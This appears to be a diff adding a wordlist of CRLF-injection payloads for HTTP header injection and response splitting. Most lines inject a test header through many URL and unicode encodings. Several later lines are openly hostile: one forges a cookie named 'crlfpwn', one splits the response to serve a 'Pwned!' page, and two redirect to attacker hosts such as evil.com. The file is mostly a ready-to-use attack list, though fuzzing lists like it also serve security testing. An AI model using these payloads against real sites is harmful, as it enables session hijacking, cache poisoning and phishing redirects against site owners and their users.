@@ -1,0 +1,69 @@
+%0AHeader-Test:CRLFFLRC
+%0A%20Header-Test:CRLFFLRC
+%20%0AHeader-Test:CRLFFLRC
+%23%OAHeader-Test:CRLFFLRC
+%E5%98%8A%E5%98%8DHeader-Test:CRLFFLRC
+%E5%98%8A%E5%98%8D%0AHeader-Test:CRLFFLRC
+%3F%0AHeader-Test:CRLFFLRC
+crlf%0AHeader-Test:CRLFFLRC
+crlf%0A%20Header-Test:CRLFFLRC
+crlf%20%0AHeader-Test:CRLFFLRC
+crlf%23%OAHeader-Test:CRLFFLRC
+crlf%E5%98%8A%E5%98%8DHeader-Test:CRLFFLRC
+crlf%E5%98%8A%E5%98%8D%0AHeader-Test:CRLFFLRC
+crlf%3F%0AHeader-Test:CRLFFLRC
+%0DHeader-Test:CRLFFLRC
+%0D%20Header-Test:CRLFFLRC
+%20%0DHeader-Test:CRLFFLRC
+%23%0DHeader-Test:CRLFFLRC
+%23%0AHeader-Test:CRLFFLRC
+%E5%98%8A%E5%98%8DHeader-Test:CRLFFLRC
+%E5%98%8A%E5%98%8D%0DHeader-Test:CRLFFLRC
+%3F%0DHeader-Test:CRLFFLRC
+crlf%0DHeader-Test:CRLFFLRC
+crlf%0D%20Header-Test:CRLFFLRC
+crlf%20%0DHeader-Test:CRLFFLRC
+crlf%23%0DHeader-Test:CRLFFLRC
+crlf%23%0AHeader-Test:CRLFFLRC
+crlf%E5%98%8A%E5%98%8DHeader-Test:CRLFFLRC
+crlf%E5%98%8A%E5%98%8D%0DHeader-Test:CRLFFLRC
+crlf%3F%0DHeader-Test:CRLFFLRC
+%0D%0AHeader-Test:CRLFFLRC
+%0D%0A%20Header-Test:CRLFFLRC
+%20%0D%0AHeader-Test:CRLFFLRC
+%23%0D%0AHeader-Test:CRLFFLRC
+\r\nHeader-Test:CRLFFLRC
+ \r\n Header-Test:CRLFFLRC
+\r\n Header-Test:CRLFFLRC
+%5cr%5cnHeader-Test:CRLFFLRC
+%E5%98%8A%E5%98%8DHeader-Test:CRLFFLRC
+%E5%98%8A%E5%98%8D%0D%0AHeader-Test:CRLFFLRC
+%3F%0D%0AHeader-Test:CRLFFLRC
+crlf%0D%0AHeader-Test:CRLFFLRC
+crlf%0D%0A%20Header-Test:CRLFFLRC
+crlf%20%0D%0AHeader-Test:CRLFFLRC
+crlf%23%0D%0AHeader-Test:CRLFFLRC
+crlf\r\nHeader-Test:CRLFFLRC
+crlf%5cr%5cnHeader-Test:CRLFFLRC
+crlf%E5%98%8A%E5%98%8DHeader-Test:CRLFFLRC
+crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:CRLFFLRC
+crlf%3F%0D%0AHeader-Test:CRLFFLRC
+%0D%0A%09Header-Test:CRLFFLRC
+crlf%0D%0A%09Header-Test:CRLFFLRC
+%250AHeader-Test:CRLFFLRC
+%25250AHeader-Test:CRLFFLRC
+%%0A0AHeader-Test:CRLFFLRC
+%25%30AHeader-Test:CRLFFLRC
+%25%30%61Header-Test:CRLFFLRC
+%u000AHeader-Test:CRLFFLRC
+//www.google.com/%2F%2E%2E%0D%0AHeader-Test:CRLFFLRC
+/www.google.com/%2E%2E%2F%0D%0AHeader-Test:CRLFFLRC
+/google.com/%2F..%0D%0AHeader-Test:CRLFFLRC
+%0D%0ASet-Cookie:crlfpwn=1
+%0D%0AContent-Length: 0%0D%0A%0D%0AHTTP/1.1 200 OK%0D%0AContent-Type: text/html%0D%0A%0D%0A<h1>Pwned!</h1>
+%0D%0ALocation: https://evil.com
+%0D%0AUpgrade-Insecure-Requests: 1%0D%0A
+%0D%0AConnection: keep-alive%0D%0A
+%0D%0AHTTP/1.1 301 Moved Permanently%0D%0ALocation: https://attackersite.com%0D%0A
+%0D%0A%5Cr%5Cn%0D%0A%5Cr%5CnHeader-Test:CRLFFLRC
+%0D%0A%5CtHeader-Test:CRLFFLRC
